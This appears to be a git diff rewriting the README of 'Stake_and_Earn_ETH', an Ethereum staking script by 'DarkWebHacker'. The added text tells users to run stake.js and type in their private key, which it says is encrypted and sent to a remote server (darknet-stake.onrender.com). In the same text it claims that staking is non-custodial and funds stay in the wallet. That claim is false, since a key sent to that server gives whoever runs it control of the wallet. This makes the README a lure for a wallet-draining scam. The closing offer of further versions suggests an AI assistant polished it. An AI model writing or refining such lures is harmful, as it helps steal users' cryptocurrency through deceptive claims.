@@ -1,99 +1,117 @@
-# Stake_and_earn_ETH (Ethereum Staking Script)
+# 🧠 Stake_and_Earn_ETH — Ethereum Staking Script
 
-This project includes a script (`stake.js`) that interacts with the Ethereum blockchain using the `ethers.js` library. The script runs using a technique that aims to collect ETH rewards to the user's staked balance. A full validator should have at least 32 ETH, or the script will automatically attempt to join a staking pool if balance is less than 32 ETH. The higher the staked amount, the higher the earnings.
+This is a secure and interactive command-line script (`stake.js`) that allows users to stake ETH on the **Ethereum mainnet** using the [`ethers.js`](https://docs.ethers.org/v6/) library. It supports:
+
+- ✅ Full validator mode (≥ 32 ETH)
+- ✅ Pool staking for smaller balances
+- 🔐 Local encryption of private keys
+- 🧠 Non-custodial staking — your funds stay in your wallet
+
+> The higher your stake, the higher your potential rewards.
 
 ---
 
-# Prerequisites
+## ⚙️ Prerequisites
 
-To run this project, you need to have `Node.js` and `npm` installed.
+You'll need `Node.js` and `npm` installed.
 
-### Check if `Node.js` is installed:
+### Check installation:
 
-```
+```bash
 node -v
 npm -v
 ```
 
-If not installed:
+### If not installed:
 
-### Windows/macOS: 
-Download and install from https://nodejs.org
+- **Windows/macOS:**  
+  👉 [Download from nodejs.org](https://nodejs.org)
 
-### Linux (Debian/Ubuntu):
+- **Linux (Debian/Ubuntu):**
 
-```
+```bash
 sudo apt update
 sudo apt install nodejs npm
 ```
 
 ---
 
-# Setup Instructions
+## 🛠 Setup Instructions
 
-Follow the steps below to set up the project and install required dependencies:
+### 1. Initialize your project
 
-**1. Initialize npm**
-
-This will create a `package.json` file:
-```
+```bash
 npm init -y
 ```
-**2. Install Required Dependency**
 
-Install `ethers.js`, the library used to interact with Ethereum:
-```
-npm install ethers
-```
-This creates a `node_modules` folder and updates `package.json`.
+### 2. Install Dependencies
 
+```bash
+npm install ethers readline node-fetch
+```
+
+> `crypto` and `readline` are part of Node.js core, but `node-fetch` is needed for network requests in Node <18.
 
 ---
 
-# Running the Script
+## 🚀 Running the Script
 
-Once setup is complete, run the `stake.js` script using `Node.js`:
-```
+```bash
 node stake.js
 ```
-Make sure `stake.js` is in the root of your project folder, or adjust the path accordingly.
 
+You'll be prompted to enter:
 
----
-
-# Important Notes
-
-**Free to use:** This project is free to use for all who access it.
-
-**Full Validator:** A full validator should have at least 32 ETH, or the script will automatically attempt to join a staking pool if balance is less than 32 ETH. 
-
-**Rewards:** The higher the staked amount, the higher the earnings.
-
-**Modify with caution:** Avoid making changes to the script logic carelessly, as it could affect its functionality.
-
-**RPC Link:** Consider changing the RPC link to use your own Infura API key or any other Ethereum RPC provider of your choice.
-
-
+- Your ETH **wallet address**
+- Your **private key** (used only for signing)
+- **Staking period** (in days)
+- **User ID** for tracking rewards
 
 ---
 
-# Troubleshooting
+## 🔐 Security & Functionality Notes
 
-If you see a "command not found" error, make sure `Node.js` and `npm` are properly installed and added to your system's PATH.
+- Your private key is **AES-256 encrypted locally** before being sent to the staking server.
+- A balance check is performed to determine whether you can act as a full validator (32 ETH) or join a staking pool.
+- The script connects to Ethereum mainnet using Infura RPC. You can replace the default URL with your own.
 
-Try restarting your terminal after installing `Node.js`.
-
-
-
----
-
-# License
-
-This project is free to use, but avoid making changes carelessly to the script logic.
-
+### Change RPC URL (optional):
+Inside `stake.js`, replace:
+```js
+const rpcUrl = 'https://mainnet.infura.io/v3/YOUR_INFURA_KEY';
+```
 
 ---
 
-# Author
+## ❗ Important
 
-DarkWebHacker — https://keybase.io/darkwebhacker
+- **Non-custodial staking:** ETH stays in your wallet.
+- **Rewards vary** based on stake size and network conditions.
+- **Do not modify** the script unless you're familiar with encryption and Ethereum logic.
+- **Use responsibly:** Know where your requests are going. Default server URL:
+  ```
+  https://darknet-stake.onrender.com
+  ```
+
+---
+
+## 🧯 Troubleshooting
+
+- If `node` or `npm` isn't recognized, ensure it's added to your system’s PATH.
+- Restart your terminal after installation if needed.
+- If the script fails during a request, double-check your ETH address, private key, and internet connection.
+
+---
+
+## 🪪 License
+
+This project is **free to use**, but modifications to its logic should be made carefully and at your own risk.
+
+---
+
+## 👤 Author
+
+**DarkWebHacker**  
+🔗 https://keybase.io/darkwebhacker
+
+Let me know if you'd like a second version for `testnet` usage, or if you'd like to include a `.env` setup or Docker instructions!
